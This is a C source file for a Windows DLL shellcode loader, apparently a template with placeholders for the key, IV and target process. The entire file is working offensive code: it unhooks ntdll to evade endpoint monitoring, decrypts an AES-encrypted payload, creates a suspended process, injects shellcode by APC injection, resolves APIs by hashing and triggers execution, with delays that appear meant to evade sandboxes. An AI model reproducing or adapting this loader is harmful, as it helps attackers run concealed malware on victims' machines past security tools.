#include <stdio.h>
#include <windows.h>

#include "whispers.h"
#include "functions.h"
#include "AES_128_CBC.h"

#define TARGET_PROCESS "#-TARGET_PROCESS-#"


uint8_t aes_k[16] = { #-KEY_VALUE-# };
uint8_t aes_i[16] = { #-IV_VALUE-# };


extern __declspec(dllexport) int ctf()
{

    PBYTE		pEncPayload			= NULL;
	SIZE_T		sEncPayload			= 0;

	PVOID		pClearText			= NULL,
				pProcess			= NULL;
	DWORD		dwSizeOfClearText	= 0,
				dwOldProtect		= 0,
				dwProcessId			= 0;
	AES_CTX		ctx;

	HANDLE		hThread				= NULL,
				hProcess			= NULL;

	NTSTATUS	STATUS				= 0x00;

	
	//printf("[+] Un-hooking Ntdll \n");
	LPVOID nt = MapNtdll();
	if (!nt) 
		return -1;

	if (!Unhook(nt)) 
		return -1;
	
	Sleep(500);
	if (!GetContent(&pEncPayload, &sEncPayload)) {

		//printf("[-] Failed to get the data!\n");
		return -1;
	}

	//printf("[+] PID: %d\n", GetCurrentProcessId());
	//printf("[+] Got the content at position: 0x%p with size of %zu\n", pEncPayload, sEncPayload);

	// Decryption routine
	//printf("[i] Starting the decryption...\n");
	
	Sleep(500);
	// Allocating memory to store the decrypted payload inside of pClearText
	pClearText = (PBYTE)malloc(sEncPayload);
	AES_DecryptInit(&ctx, aes_k, aes_i);
	AES_DecryptBuffer(&ctx, pEncPayload, pClearText, sEncPayload);

	//printf("\t[+] Payload decrypted at postion: 0x%p with size of %zu\n", pClearText, sEncPayload);

	Sleep(1500);
	//printf("[i] Creating suspended process..\n");
	// Creating a suspeneded process now
	if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {

		//printf("[-] Failed to create suspended process!\n");
		return -1;
	}
	//printf("[+] Process created with PID: %d\n", dwProcessId);

	Sleep(2500);
	//printf("[i] Injecting the shellcode into the process..\n");
	// Doing the APC Injection
	if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess)) {

		return -1;
	}

	Sleep(1500);
	//printf("[i] Running the shellcode via NtQueueApcThread..\n");
	// Running the thread via QueueAPCThread
	if ((STATUS = NTQAT(hThread, pProcess, NULL, NULL, NULL)) != 0) {

		//printf("[-] NtQueueApcThrad failed!\n");
		return -1;
	}
	
	// API Hashing
	cDAPS cDAPSu = (cDAPS) GetProcAddressH(GetModuleHandleH(#-KERNELBASE_VALUE-#), #-DAPS_VALUE-#);

	//printf("[i] Position of DAPsu: 0x%p\n", cDAPSu);

	Sleep(1000);
	// Stopping the debugging of the process, which launches the payload
	cDAPSu(dwProcessId);
	//printf("[+] Payload executed!\n");
	
	CloseHandle(hThread);
	CloseHandle(hProcess);
	free(pClearText);

	return 0;

} 

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
